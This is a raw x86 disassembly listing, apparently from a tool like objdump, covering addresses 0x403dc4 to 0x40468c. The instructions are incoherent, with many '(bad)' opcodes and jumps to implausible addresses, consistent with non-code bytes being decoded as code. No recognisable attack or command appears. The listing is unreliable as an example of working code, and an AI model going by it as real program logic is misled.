  403dc4:	inc    DWORD PTR [eax]
  403dc6:	out    dx,al
  403dc7:	lods   eax,DWORD PTR ds:[esi]
  403dc8:	mov    es,WORD PTR [ebp-0x8b91]
  403dce:	or     al,0x7d
  403dd0:	clc    
  403dd1:	(bad)  
  403dd2:	fs jae 0x403dd5
  403dd5:	add    BYTE PTR [ebx+0x1],ah
  403dd8:	mov    DWORD PTR [ebp-0x8dd9],0x152
  403de2:	(bad)  
  403de3:	test   DWORD PTR [eax],eax
  403de5:	push   DWORD PTR [ebx+esi*2]
  403de8:	push   DWORD PTR [ebp+0x2b]
  403deb:	test   BYTE PTR [eax],al
  403ded:	lea    ecx,[esi+0x64fffe6c]
  403df3:	pop    eax
  403df4:	push   0x0
  403df6:	jmp    0x67c5cb03
  403dfb:	jb     0x403dfc
  403dfd:	inc    ebx
  403dff:	push   cs
  403e00:	add    al,ch
  403e02:	pop    ss
  403e03:	sbb    DWORD PTR [eax],eax
  403e05:	add    BYTE PTR [eax+0x59],ah
  403e08:	push   DWORD PTR [eax+eax*1+0x0]
	...
  403e1c:	fild   QWORD PTR [ecx-0x4e308a41]
  403e22:	mov    edi,0x120deeb
  403e27:	add    bl,ah
  403e29:	or     cl,cl
  403e2b:	ret    0x8cb
  403e2e:	push   ebp
  403e2f:	mov    esi,DWORD PTR [edi]
  403e31:	add    ah,0xfc
  403e34:	jo     0x403dff
  403e36:	fisubr DWORD PTR [edx+0x59]
  403e39:	jne    0x403eb0
  403e3b:	or     BYTE PTR [ebx+0x2c],cl
  403e3e:	(bad)  
  403e3f:	jmp    esp
  403e41:	test   eax,0xa6f74bf
  403e46:	pop    edx
  403e47:	jmp    FWORD PTR [esi-0x50]
  403e4a:	out    0x7f,eax
  403e4c:	in     al,0x75
  403e4e:	dec    DWORD PTR [ebx]
  403e50:	cli    
  403e51:	fnsave [esi]
  403e53:	add    ah,BYTE PTR [ecx+0x62]
  403e56:	sbb    eax,0x7e9ce000
  403e5b:	inc    ebp
  403e5c:	mov    ?,WORD PTR gs:[eax+0x705f275]
  403e63:	mov    eax,0xc0869dfa
  403e68:	int3   
  403e69:	or     eax,0xe5ee457d
  403e6e:	inc    esi
  403e6f:	inc    edi
  403e71:	lahf   
  403e72:	je     0x403e75
  403e74:	xor    ecx,0x58088aff
  403e7a:	add    al,0x6a
  403e7c:	sti    
  403e7d:	sbb    BYTE PTR [esi-0x1],al
	...
  403e90:	add    BYTE PTR [eax],al
  403e92:	retf   0x3672
  403e95:	or     al,0x15
  403e97:	adc    BYTE PTR [edi+edi*8],dl
  403e9a:	xchg   DWORD PTR [ecx-0x74d94765],esi
  403ea0:	mov    al,0x3b
  403ea2:	mov    bh,0xad
  403ea4:	xor    eax,0x86a1e102
  403ea9:	(bad)  [esi+0x52]
  403eac:	jl     0x403e71
  403eae:	inc    ecx
  403eaf:	jne    0x403e76
  403eb1:	adc    al,0xfa
  403eb3:	or     BYTE PTR [ebp-0x14],bh
  403eb6:	jnp    0x403f19
  403eb8:	add    edi,eax
  403eba:	int    0x22
  403ebc:	push   esp
  403ebd:	sub    esp,DWORD PTR [ecx+0x47ff4dd7]
  403ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ec4:	fwait
  403ec5:	sbb    BYTE PTR [ebp-0x45f44fc6],dh
  403ecb:	imul   ebp,DWORD PTR [eax],0x35eb406a
  403ed1:	or     BYTE PTR [edx-0x6a004f59],dl
  403ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ed8:	ret    
  403ed9:	jne    0x403ed3
  403edb:	add    al,0x12
  403edd:	pop    eax
  403ede:	jnp    0x403f09
  403ee0:	stc    
  403ee1:	add    esi,edx
  403ee3:	add    al,0xe9
  403ee5:	cmp    ebp,edi
  403ee7:	ins    BYTE PTR es:[edi],dx
  403ee8:	jmp    0x12ebace8
  403eed:	add    al,0x71
  403eef:	inc    ecx
  403ef0:	fstp   DWORD PTR ds:0x866454fa
	...
  403f06:	add    BYTE PTR [eax],al
  403f08:	cli    
  403f09:	lods   al,BYTE PTR ds:[esi]
  403f0a:	out    dx,al
  403f0b:	scas   eax,DWORD PTR es:[edi]
  403f0c:	stos   BYTE PTR es:[edi],al
  403f0d:	stos   DWORD PTR es:[edi],eax
  403f0e:	pop    esp
  403f0f:	cld    
  403f10:	pop    ebp
  403f11:	das    
  403f12:	xchg   esi,eax
  403f13:	add    al,0xfa
  403f15:	sub    DWORD PTR [ecx-0x26007d3],0xd247f938
  403f1f:	out    0xb5,eax
  403f21:	jg     0x403f37
  403f23:	add    BYTE PTR [ecx+0x16],dh
  403f26:	inc    ebx
  403f27:	add    al,0xaa
  403f29:	jns    0x403f8f
  403f2b:	add    al,0x12
  403f2d:	stos   DWORD PTR es:[edi],eax
  403f2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f2f:	push   esp
  403f30:	add    eax,0xa8aeed31
  403f35:	adc    al,0x31
  403f37:	fnstsw WORD PTR [esi]
  403f39:	adc    eax,0x50a316a
  403f3e:	cld    
  403f3f:	add    bh,BYTE PTR [ecx]
  403f41:	sahf   
  403f42:	in     eax,0x88
  403f44:	shl    DWORD PTR [ecx],0x50
  403f47:	jnp    0x403f02
  403f49:	dec    esi
  403f4a:	mov    al,ds:0xbc04fec2
  403f4f:	jp     0x403f27
  403f51:	xchg   BYTE PTR ds:0x55f625ac,ah
  403f57:	sbb    bh,dl
  403f59:	push   ecx
  403f5a:	dec    esi
  403f5b:	cmp    DWORD PTR [edx],eax
  403f5d:	popf   
  403f5e:	sbb    cl,bl
  403f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f61:	stos   BYTE PTR es:[edi],al
  403f62:	es dec ecx
  403f64:	sahf   
  403f65:	add    eax,0x4f9e900
  403f6a:	mov    edx,DWORD PTR [eax+eax*1+0x0]
	...
  403f7d:	add    BYTE PTR [ecx+0x3374127f],dl
  403f83:	lods   eax,DWORD PTR ds:[esi]
  403f84:	push   eax
  403f85:	xchg   ebx,eax
  403f86:	cmc    
  403f87:	ja     0x403fce
  403f89:	adc    eax,0xe175a9ce
  403f8e:	pushf  
  403f8f:	push   edi
  403f90:	or     al,0xae
  403f92:	jle    0x403fbc
  403f94:	cld    
  403f95:	in     al,dx
  403f96:	arpl   cx,di
  403f98:	or     DWORD PTR [ebp+0x53],edi
  403f9b:	xchg   DWORD PTR [ebp-0xf],edi
  403f9e:	stc    
  403f9f:	das    
  403fa0:	leave  
  403fa1:	sbb    bh,BYTE PTR [esi]
  403fa3:	sahf   
  403fa4:	add    eax,0xc0863472
  403fa9:	jmp    0x4ff9:0xe5c2bbc4
  403fb0:	mov    edx,ebp
  403fb2:	js     0x403f75
  403fb4:	hlt    
  403fb5:	sbb    al,ch
  403fb7:	sbb    al,0x98
  403fb9:	repz stc 
  403fbb:	add    al,0xe8
  403fbd:	ficom  WORD PTR [ebp-0x56]
  403fc0:	push   DWORD PTR [eax-0x4e]
  403fc3:	test   al,0x8d
  403fc5:	and    al,0x42
  403fc7:	push   ebp
  403fc8:	call   0xffea00a2
  403fcd:	fcmovb st,st(0)
  403fcf:	push   ds
  403fd0:	push   ds
  403fd1:	adc    esp,eax
  403fd3:	and    DWORD PTR [eax],eax
  403fd5:	cmp    ecx,0x4
  403fd8:	(bad)  
  403fd9:	cld    
  403fda:	lea    ebp,[ecx-0x7f8e1e8b]
  403fe0:	(bad)  
  403fe1:	data16 add BYTE PTR [eax],al
	...
  403ff4:	xchg   esp,eax
  403ff5:	jg     0x403fb7
  403ff7:	out    dx,al
  403ff8:	jne    0x403fee
  403ffa:	add    cl,ch
  403ffc:	stc    
  403ffd:	test   eax,0x78915575
  404002:	fild   DWORD PTR [eax]
  404004:	cmp    al,0x5b
  404006:	cmp    eax,0x63900
  40400b:	jbe    0x403fb3
  40400d:	mov    BYTE PTR [ecx+eax*1],bl
  404010:	mov    ds:0xe775ff05,eax
  404015:	lea    ebx,[edx-0x1]
  404018:	fcomp  QWORD PTR [edx-0x7b]
  40401b:	rcl    BYTE PTR [edi+0x775ffc1],0x8e
  404022:	(bad)  
  404023:	(bad)  
  404025:	pop    edx
  404026:	mov    edx,DWORD PTR [ebp+0x67]
  404029:	sub    edx,DWORD PTR [edx]
  40402b:	push   0x63
  40402d:	or     eax,0x5632134
  404032:	push   DWORD PTR [ebp+0x5f]
  404035:	push   edi
  404036:	jne    0x40402c
  404038:	sbb    al,0x56
  40403a:	or     al,0xc7
  40403c:	out    0x58,al
  40403e:	add    BYTE PTR [eax],al
  404040:	and    eax,DWORD PTR ds:0x4608e668
  404046:	add    bh,bh
  404048:	out    0x74,al
  40404a:	call   0x40d568
  40404f:	push   ebx
  404050:	sbb    ch,al
  404052:	je     0x40408a
  404054:	mov    BYTE PTR [eax+0x68],bl
  404057:	out    0x0,al
	...
  404069:	add    BYTE PTR [eax],ch
  40406b:	inc    esi
  40406c:	add    al,ch
  40406e:	adc    ebp,DWORD PTR ds:0x5ce00000
  404074:	push   edi
  404075:	inc    edi
  404076:	push   0xc294b9ba
  40407b:	add    al,0x0
  40407d:	mov    al,0xde
  40407f:	jbe    0x40402f
  404081:	mov    eax,0x1427
  404086:	call   0x1c88074e
  40408b:	add    DWORD PTR [edi+0x53],edx
  40408e:	cli    
  40408f:	inc    ebp
  404090:	mov    cl,0xb5
  404092:	cli    
  404093:	popf   
  404094:	jp     0x4040db
  404096:	mov    ds:0x9d47c55f,al
  40409b:	cdq    
  40409c:	dec    esp
  40409d:	pop    ebx
  40409e:	and    ch,al
  4040a0:	fadd   DWORD PTR [eax-0x6]
  4040a3:	(bad)  
  4040a4:	ss cld 
  4040a6:	xchg   edx,eax
  4040a7:	out    dx,al
  4040a8:	jbe    0x4040aa
  4040aa:	cli    
  4040ab:	push   0xfffffff8
  4040ad:	mov    edi,0xf87859ee
  4040b2:	loop   0x4040c3
  4040b4:	fld    DWORD PTR [eax-0x6]
  4040b7:	adc    eax,0x9dfab3e5
  4040bc:	add    al,bh
  4040be:	lods   eax,DWORD PTR ds:[esi]
  4040bf:	push   esi
  4040c0:	js     0x4040a1
  4040c2:	xchg   ebx,eax
  4040c3:	push   edx
  4040c4:	adc    eax,DWORD PTR [eax]
  4040c6:	cli    
  4040c7:	(bad)  
  4040c8:	(bad)  
  4040c9:	icebp  
  4040ca:	mov    WORD PTR [esi-0x69],fs
  4040cd:	adc    DWORD PTR [eax],eax
	...
  4040df:	add    dl,bh
  4040e1:	popf   
  4040e2:	fadd   st,st(0)
  4040e4:	xor    al,0xdf
  4040e6:	lods   al,BYTE PTR ds:[esi]
  4040e7:	add    ch,cl
  4040e9:	or     bl,BYTE PTR [edi+eiz*2-0x745398d8]
  4040f0:	scas   eax,DWORD PTR es:[edi]
  4040f1:	int    0xf8
  4040f3:	rol    DWORD PTR [esi+0x11027aa1],1
  4040f9:	cwde   
  4040fa:	push   ebx
  4040fb:	call   0xffecbd0b
  404100:	push   ebp
  404101:	pop    eax
  404102:	inc    esp
  404103:	(bad)  
  404104:	call   esi
  404106:	dec    eax
  404107:	jmp    FWORD PTR [edi+0x2a]
  40410a:	fwait
  40410b:	and    eax,0x83ac26bf
  404110:	push   edi
  404111:	add    esi,DWORD PTR ss:[edi-0xb]
  404115:	pop    esi
  404116:	inc    esi
  404117:	clc    
  404118:	cli    
  404119:	add    al,0xe9
  40411b:	arpl   dx,di
  40411d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40411e:	aam    0xab
  404120:	mov    ch,0x31
  404122:	pop    ebp
  404123:	lods   al,BYTE PTR ds:[esi]
  404124:	daa    
  404125:	std    
  404126:	inc    eax
  404127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40412a:	inc    esi
  40412b:	lods   al,BYTE PTR ds:[esi]
  40412c:	daa    
  40412d:	mov    cl,0x51
  40412f:	xchg   BYTE PTR [eax+0x4df836a7],dh
  404135:	xor    ebx,ebp
  404137:	cwde   
  404138:	loope  0x404135
  40413a:	sub    BYTE PTR [edi],dh
  40413c:	in     eax,0x7b
  40413e:	mov    ah,0xb7
  404140:	adc    DWORD PTR [edx],0x3616
	...
  404156:	(bad)  
  404157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404158:	xchg   esp,eax
  404159:	mov    bh,0x65
  40415b:	push   edx
  40415c:	mov    ebp,0xe42c3a86
  404161:	push   0x3e904fb
  404166:	adc    DWORD PTR [ecx-0xb],0x5ca7e877
  40416d:	mov    al,0x3d
  40416f:	push   edx
  404170:	icebp  
  404171:	stos   BYTE PTR es:[edi],al
  404172:	scas   eax,DWORD PTR es:[edi]
  404173:	test   al,0xc1
  404175:	jg     0x40418f
  404177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404178:	into   
  404179:	jg     0x4041b4
  40417b:	inc    edi
  40417c:	and    bh,BYTE PTR [ebp+0x50e8f838]
  404182:	sbb    DWORD PTR [eax+0x4f4ac06a],0x1c20df1a
  40418c:	jmp    0x91e73f74
  404191:	sbb    al,0xa6
  404194:	xchg   esi,eax
  404195:	jge    0x4041ce
  404197:	test   eax,0x51a0401
  40419c:	jmp    0x7ee3a53c
  4041a1:	stos   DWORD PTR es:[edi],eax
  4041a2:	add    DWORD PTR [eax+0x0],0x3d
  4041a6:	out    dx,al
  4041a7:	add    al,0x20
  4041a9:	jmp    0x4bacdea7
  4041ae:	xchg   ecx,eax
  4041af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041b0:	mov    DWORD PTR [ebp+ebx*1+0x1f297d78],esp
  4041b7:	jmp    0x412abb
	...
  4041cc:	stc    
  4041cd:	icebp  
  4041ce:	mov    edi,0x45be3c3a
  4041d3:	sub    DWORD PTR [edx-0x4716005a],esp
  4041d9:	inc    eax
  4041da:	aam    0x2e
  4041dc:	icebp  
  4041dd:	add    al,0x0
  4041df:	cmp    esi,DWORD PTR cs:[ebp+0x4f9feff]
  4041e6:	call   FWORD PTR [ebp+edx*4-0x6ec6ba8a]
  4041ed:	xor    BYTE PTR [esi+esi*2-0x5b726745],dh
  4041f4:	cmp    DWORD PTR [ebp+0x68],edx
  4041f7:	jmp    0x83c046f5
  4041fc:	stc    
  4041fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041fe:	jne    0x4041f1
  404200:	popa   
  404201:	arpl   WORD PTR [ecx+ebp*8+0x5dbff9f9],si
  404208:	clc    
  404209:	cmp    DWORD PTR [ebp-0x47],0xd0052ff9
  404210:	arpl   WORD PTR ds:0x4038e900,ax
  404216:	mov    al,0xb6
  404218:	add    BYTE PTR ds:0x74ba5c00,al
  40421e:	push   eax
  40421f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404220:	retf   0x6868
  404223:	jmp    0x64c04721
  404228:	cmp    al,ch
  40422a:	push   eax
  40422b:	adc    DWORD PTR [edx],0x71
	...
  404241:	add    bl,dl
  404243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404244:	mov    edi,0xa988de75
  404249:	add    bl,ah
  40424b:	add    DWORD PTR [ebx+0xc40f45],ecx
  404251:	add    BYTE PTR [esi-0x23],al
  404254:	mov    edi,0x117b9
  404259:	add    BYTE PTR [eax],dl
  40425b:	shl    ebx,0xaa
  40425e:	fadd   QWORD PTR [eax+eax*8+0x3c]
  404262:	xchg   ebx,eax
  404263:	add    DWORD PTR [eax],eax
  404265:	dec    DWORD PTR [esi+0x15]
  404268:	pop    DWORD PTR [ebp+0x37]
  40426b:	ret    
  40426c:	inc    ebp
  40426d:	aam    0xd4
  40426f:	cli    
  404270:	(bad)  
  404271:	dec    esp
  404273:	inc    esp
  404274:	lock push DWORD PTR [ecx+eax*1+0x0]
  404279:	lea    ebx,[esi+0x536a50c1]
  40427f:	pop    es
  404280:	add    bh,bh
  404282:	ficomp WORD PTR ds:0x20f31e8
  404288:	add    BYTE PTR [ebx],cl
  40428a:	and    edx,esi
  40428c:	add    eax,0xd1d683
  404291:	jne    0x4042e4
  404293:	mov    BYTE PTR [eax-0x1],ah
  404296:	into   
  404297:	pop    esp
  404298:	push   DWORD PTR [ebp-0x71]
  40429b:	or     BYTE PTR [eax],al
  40429d:	sub    al,0xd2
  40429f:	add    bh,bh
  4042a1:	jne    0x40431a
  4042a3:	mov    dl,cl
  4042a5:	mov    bl,0x0
	...
  4042b7:	add    BYTE PTR [ebx],ah
  4042b9:	add    DWORD PTR [ebx-0x4953cc3c],eax
  4042bf:	inc    ebp
  4042c0:	imul   edx,DWORD PTR [eax+0x6a],0x0
  4042c4:	push   esp
  4042c5:	aad    0xfb
  4042c7:	call   0x3fb651
  4042cc:	cli    
  4042cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042ce:	ret    
  4042cf:	jne    0x4042c9
  4042d1:	xchg   bh,ch
  4042d3:	mov    BYTE PTR [edi],dh
  4042d5:	inc    esi
  4042d6:	test   eax,0x25769675
  4042db:	mov    dl,0xfa
  4042dd:	lods   eax,DWORD PTR ds:[esi]
  4042de:	push   ebx
  4042df:	dec    DWORD PTR [edi-0xe]
  4042e2:	test   al,0x75
  4042e4:	xor    BYTE PTR [esi],0x4f
  4042e7:	sti    
  4042e8:	mov    ch,0x43
  4042ea:	std    
  4042eb:	mov    edi,0x109cb027
  4042f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042f1:	mov    ecx,0x9a27ff13
  4042f6:	test   al,0x75
  4042f8:	push   edx
  4042f9:	ss out dx,eax
  4042fb:	cld    
  4042fc:	(bad)  
  4042fd:	fstp   TBYTE PTR [eax+ebx*8-0x7b]
  404301:	pop    ecx
  404302:	imul   ebp,eax,0xffffffef
  404305:	inc    ecx
  404306:	add    al,0x0
  404308:	jne    0x404383
  40430a:	outs   dx,DWORD PTR ds:[esi]
  40430b:	call   0xffe9502f
  404310:	gs jns 0x40437a
  404313:	call   0xffe9502f
  404318:	push   ebp
  404319:	sbb    DWORD PTR [edi+0xe8],esp
	...
  40432b:	add    BYTE PTR [eax],al
  40432d:	add    bh,ch
  40432f:	or     al,0xa9
  404331:	push   DWORD PTR [ecx-0x11]
  404334:	dec    esp
  404335:	pop    edi
  404336:	xor    esi,DWORD PTR [eax-0x9]
  404339:	dec    esi
  40433b:	push   ss
  40433c:	xchg   edi,eax
  40433d:	xor    DWORD PTR [esi],0xffffffba
  404340:	jl     0x404387
  404342:	mul    BYTE PTR [esi+0x72f474c3]
  404348:	add    eax,DWORD PTR [eax]
  40434a:	cli    
  40434b:	lods   eax,DWORD PTR ds:[esi]
  40434c:	add    eax,edi
  40434e:	mov    bh,0x59
  404350:	add    eax,DWORD PTR [eax]
  404352:	cli    
  404353:	lods   eax,DWORD PTR ds:[esi]
  404354:	jbe    0x40439b
  404356:	inc    BYTE PTR [ecx+edi*1]
  404359:	test   eax,0x2e9e116f
  40435e:	add    ch,BYTE PTR [ebp-0x5c1a5600]
  404364:	push   0x26
  404366:	fiadd  WORD PTR [edi*8+0x7e056010]
  40436d:	cs (bad) 
  40436f:	mov    ds:0x3ad2a7fc,eax
  404374:	outs   dx,DWORD PTR ds:[esi]
  404375:	test   al,0xbd
  404377:	xor    al,0x66
  404379:	cs mov dh,0xac
  40437c:	cmp    DWORD PTR [ebx-0x454e5c53],esp
  404382:	mov    eax,0x714ee90c
  404387:	mov    al,0x6a
  404389:	mov    edi,0x3e262a96
  40438e:	mov    es,WORD PTR ds:0x21e9
	...
  4043a4:	mov    ebp,0xfa092f49
  4043a9:	cs in  eax,dx
  4043ab:	jbe    0x40436c
  4043ad:	mov    al,ds:0x47a1bb9
  4043b2:	jmp    0xee415ba
  4043b7:	add    edi,edx
  4043b9:	mov    ds:0x755dfb7c,eax
  4043be:	cmp    al,BYTE PTR [ebx]
  4043c0:	cli    
  4043c1:	int    0x2b
  4043c3:	inc    DWORD PTR [ebp+0x38]
  4043c6:	bound  edx,QWORD PTR [edi+0x4f95c879]
  4043cc:	leave  
  4043cd:	retf   
  4043ce:	and    al,0x58
  4043d0:	cli    
  4043d1:	add    al,0xe9
  4043d3:	add    ebp,ecx
  4043d5:	mov    edi,0x50a0441
  4043da:	jmp    0xbee4b77a
  4043df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043e0:	or     DWORD PTR [ecx+0x0],0xffffffa9
  4043e4:	out    0x4,al
  4043e6:	adc    cl,ch
  4043e8:	stc    
  4043e9:	lods   al,BYTE PTR ds:[esi]
  4043ea:	mov    WORD PTR [ecx+0x2489a29d],cs
  4043f0:	pop    esi
  4043f1:	sub    eax,0x4f9f900
  4043f6:	call   0xffe2da09
  4043fb:	jo     0x404438
  4043fd:	popa   
  4043fe:	(bad)  
  4043ff:	cld    
  404400:	lea    ebx,[esp+edi*1-0x17]
  404404:	stc    
  404405:	add    al,0x33
  404407:	test   eax,0x0
	...
  404418:	add    BYTE PTR [eax],al
  40441a:	mov    DWORD PTR [edi-0x39],ebp
  40441d:	lods   al,BYTE PTR ds:[esi]
  40441e:	jne    0x404401
  404420:	(bad)  
  404421:	call   0x29b5e61f
  404426:	sub    eax,0xeb4ed448
  40442b:	pop    esp
  40442c:	(bad)  
  40442d:	lods   al,BYTE PTR ds:[esi]
  40442e:	dec    ecx
  40442f:	retf   0x2145
  404432:	push   ebp
  404433:	adc    al,BYTE PTR [eax]
  404435:	jmp    0x2f348c7e
  40443a:	test   DWORD PTR [edx-0x37448b01],esp
  404440:	push   eax
  404441:	xchg   ecx,eax
  404442:	stc    
  404443:	add    al,0x0
  404445:	imul   eax,DWORD PTR [eax],0x6194ff05
  40444b:	stos   BYTE PTR es:[edi],al
  40444c:	mov    ch,0x3b
  40444e:	inc    BYTE PTR [ebx+ecx*1]
  404451:	sub    DWORD PTR [edx],ecx
  404453:	or     eax,DWORD PTR [ebx+0x75053574]
  404459:	in     al,0x5e
  40445b:	mov    al,ds:0xc9f9e900
  404460:	inc    ebp
  404461:	cdq    
  404462:	push   esp
  404463:	adc    al,BYTE PTR [eax]
  404465:	jmp    0x39f08c0c
  40446a:	push   ebp
  40446b:	sbb    BYTE PTR [eax+eax*1+0x8ab],bh
  404472:	mov    ds:0xe3c4451c,eax
  404477:	adc    BYTE PTR [eax+0xb0613b2],0xc0
	...
  40448e:	add    BYTE PTR [eax],al
  404490:	push   ss
  404491:	add    al,0xe9
  404493:	fsub   st,st(3)
  404495:	add    eax,0x31168b00
  40449a:	mov    BYTE PTR [eax],0xd3
  40449d:	sbb    al,0x7d
  40449f:	les    edi,FWORD PTR [edx]
  4044a1:	stos   BYTE PTR es:[edi],al
  4044a2:	(bad)  
  4044a3:	jmp    ebx
  4044a5:	xchg   esi,eax
  4044a6:	mov    edi,0x456339f3
  4044ab:	les    ecx,FWORD PTR [edi+0x1c000005]
  4044b1:	aad    0xb7
  4044b3:	(bad)  
  4044b4:	push   esi
  4044b5:	push   ebp
  4044b6:	mov    DWORD PTR [ebp-0x15],0x93000f6a
  4044bd:	bound  eax,QWORD PTR [ebp-0xc]
  4044c0:	cmp    al,0x9b
  4044c2:	(bad)  
  4044c3:	call   FWORD PTR [esi]
  4044c5:	inc    ebp
  4044c6:	les    edx,FWORD PTR [eax-0x47]
  4044c9:	add    eax,0xd4cc006a
  4044ce:	mov    ebx,0x13a7e8
  4044d3:	add    BYTE PTR [eax-0x3b],ch
  4044d6:	je     0x4044de
  4044d8:	shr    ah,1
  4044da:	rol    DWORD PTR [eax],cl
  4044dc:	xchg   BYTE PTR [ecx+ebp*8],al
  4044df:	mov    WORD PTR [ebx+0x5],fs
  4044e2:	add    bh,bh
  4044e4:	(bad)  
  4044e5:	cmc    
  4044e6:	(bad)  
  4044e7:	jne    0x4044fc
  4044e9:	imul   esi,DWORD PTR [ebp-0x48],0x7b
  4044ed:	push   ebx
  4044ee:	sub    al,BYTE PTR [ecx+0x23]
  4044f1:	push   0xbc75
	...
  404506:	dec    ebx
  404507:	iret   
  404508:	mov    cl,0x0
  40450a:	cli    
  40450b:	stos   DWORD PTR es:[edi],eax
  40450c:	add    ah,0x6
  40450f:	ret    
  404510:	ins    BYTE PTR es:[edi],dx
  404511:	inc    ebp
  404512:	ss sti 
  404514:	sbb    DWORD PTR [eax],eax
  404516:	or     eax,0x1e8c3d8
  40451b:	push   ebx
  40451c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40451d:	push   ecx
  40451f:	imul   ebp,DWORD PTR [edi],0x2
  404522:	loope  0x40456c
  404524:	jnp    0x40456b
  404526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404527:	jg     0x404558
  404529:	mov    ah,0xd2
  40452b:	dec    ebp
  40452c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40452d:	(bad)  
  40452e:	fisttp QWORD PTR [edi-0x91d43d1]
  404534:	jae    0x404536
  404536:	cli    
  404537:	std    
  404538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404539:	jne    0x4044c1
  40453b:	pop    ss
  40453c:	das    
  40453d:	mov    ah,0xd2
  40453f:	hlt    
  404540:	stos   BYTE PTR es:[edi],al
  404541:	push   DWORD PTR [ebp-0x78a3c6d]
  404547:	xor    dh,bl
  404549:	and    BYTE PTR [edi],0x9e
  40454c:	add    esi,DWORD PTR [esi+eax*1+0x4f]
  404550:	das    
  404551:	adc    BYTE PTR [ebp+0x7fef761],dl
  404557:	sbb    bl,BYTE PTR [eax+eax*2+0xba4d783]
  40455e:	mov    edx,0xdeb0159
  404563:	adc    ecx,esp
  404565:	or     edx,DWORD PTR [ecx+0x7a]
  404568:	adc    cl,BYTE PTR [ebp+0x0]
	...
  40457a:	add    BYTE PTR [eax],al
  40457c:	mov    edi,0xe7ff5449
  404581:	cdq    
  404582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404583:	jne    0x404513
  404585:	test   BYTE PTR [edx],0xfb
  404588:	dec    ebp
  404589:	lahf   
  40458a:	js     0x404564
  40458c:	inc    ebp
  40458d:	and    DWORD PTR [edi-0x18],ebp
  404590:	dec    ebx
  404591:	fld    QWORD PTR [ebx]
  404593:	add    BYTE PTR ds:0x22c45c05,dh
  404599:	idiv   BYTE PTR [ebp+0x5ca025a4]
  40459f:	push   0xa4ae0e12
  4045a4:	adc    eax,0x226c3ca0
  4045a9:	push   es
  4045aa:	sahf   
  4045ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ac:	add    eax,0xfa583484
  4045b1:	sbb    cl,ah
  4045b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045b4:	outs   dx,DWORD PTR ds:[esi]
  4045b5:	jno    0x404548
  4045b7:	mov    al,0xcc
  4045b9:	lahf   
  4045ba:	sahf   
  4045bb:	js     0x404576
  4045bd:	cmp    esi,DWORD PTR [esi]
  4045bf:	mov    ebx,0x4ee8f4b8
  4045c4:	xor    DWORD PTR [eax+0x33d2bf6a],0x2179c8d2
  4045ce:	in     eax,0x3
  4045d0:	inc    esi
  4045d1:	dec    edi
  4045d2:	push   0x26
  4045d4:	or     al,BYTE PTR ds:0x497f3bdd
  4045da:	pop    ebp
  4045db:	push   ebx
  4045dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045dd:	sbb    ebp,esp
  4045df:	fwait
	...
  4045f0:	add    BYTE PTR [eax],al
  4045f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045f3:	push   esp
  4045f4:	jmp    0xc204c4fc
  4045f9:	repz mov WORD PTR [ecx],ds
  4045fc:	in     eax,dx
  4045fd:	fwait
  4045fe:	jle    0x4045b6
  404600:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  404602:	jae    0x40464d
  404604:	xor    DWORD PTR [edi+ebp*8-0x6299ee60],esp
  40460b:	add    al,0xe9
  40460d:	clc    
  40460e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40460f:	sbb    al,dh
  404611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404612:	out    0xf4,eax
  404614:	or     eax,0x634522e
  404619:	add    ch,BYTE PTR cs:[ebp-0x60ba5a16]
  404620:	add    BYTE PTR [edx+0x31],ah
  404623:	lahf   
  404624:	jne    0x404613
  404626:	nop
  404627:	scas   ax,WORD PTR es:[edi]
  404629:	jmp    0xedb5e627
  40462e:	push   ecx
  40462f:	cmp    al,0xd8
  404631:	(bad)  
  404632:	pop    ecx
  404633:	mov    eax,ebx
  404635:	xor    al,BYTE PTR [edi-0x3e]
  404638:	or     al,0xe9
  40463a:	ror    BYTE PTR [ebx+0x143268ec],cl
  404640:	(bad)  
  404641:	mov    dh,0x59
  404643:	xchg   ecx,eax
  404644:	test   DWORD PTR [ebx],edi
  404646:	cwde   
  404647:	sahf   
  404648:	(bad)  
  404649:	cmp    DWORD PTR [esi],ebx
  40464b:	add    al,0x1
  40464d:	jmp    0x58a3f34b
  404652:	test   BYTE PTR [ecx+ecx*8],0xaa
	...
  404666:	add    BYTE PTR [eax],al
  404668:	adc    ecx,DWORD PTR [edx+0xd1b6aec]
  40466e:	add    ch,dh
  404670:	clc    
  404671:	cmp    DWORD PTR [ebp-0x27],0x6e1918f9
  404678:	adc    edi,ecx
  40467a:	(bad)  
  40467b:	fadd   QWORD PTR [ecx]
  40467d:	lods   eax,DWORD PTR ds:[esi]
  40467e:	fiadd  DWORD PTR [ebx+0x59]
  404681:	sahf   
  404682:	(bad)  
  404683:	fsubr  QWORD PTR [ecx+0x58dd759f]
  404689:	sbb    BYTE PTR [eax],cl
  40468b:	push   ecx
  40468c:	hlt    
